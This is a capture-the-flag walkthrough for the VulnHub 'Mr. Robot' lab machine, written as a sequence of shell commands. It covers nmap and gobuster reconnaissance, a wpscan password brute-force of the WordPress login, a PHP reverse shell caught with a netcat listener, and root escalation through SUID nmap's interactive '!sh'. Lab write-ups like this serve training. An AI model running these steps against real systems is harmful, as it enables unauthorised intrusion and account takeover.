VulnHub Mr. Robot Walkthrough
Youtube link for the walkthrough: https://www.youtube.com/watch?v=HJMV5SaWbF0 

Discovering the IP address of the machine 
$ sudo arp-scan -l 
<br>
check the website 
http://10.0.2.5 
you can also check the website tech stack with the help of wappalyzer

running an nmap scan 
$ sudo nmap -sC -sV -A 10.0.2.5 -o leavemehere.dat 

now scan the directory 
$ gobuster dir -u http://10.0.2.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
with this you will get the wordpress login page 
copy the address 
http://10.0.2.5/wp-login.php 
check the username "elliot" 

also check the robots.txt file, here you will get two files 
one is the wordlist and other is the first key of this challenge 
you can download the files with 'wget' command 
also in the wordlist, some of the words are repeated here 
we will sort them and remove the duplicates 
$ cat fsociety.dic | sort | uniq > fs.dic 
lets now bruteforce the login with the wordlist 
$ wpscan --url http://10.0.2.5/wp-login.php --username elliot --passwords ./fs.dic 
with this you will get the password for the username 

now when you login the wordpress website you can use the PHP reverse shell script 
change the IP address to the kali IP address in the script 
now run the netcat 
$ nc -lnvp 1234 
you will get the shell here 
check the id and the release version 
$ id 
$ lsb_release -a 
spawn the shell 
python -c "import pty; pty.spawn('/bin/bash')" 

in the robot directory you will get the password for the user 'robot' 
login with that credential and access the second key 
now to navigate to the root folder 
you have to escalate privilege 
$ find / -type f -perm -u=s 2>/dev/null 
you will find that you can use nmap 
you can use the nmap in an interactive mode to get the shell 
$ nmap --interactive 
nmap > !sh 
you will get the root shell now 
and then you can get the final key 
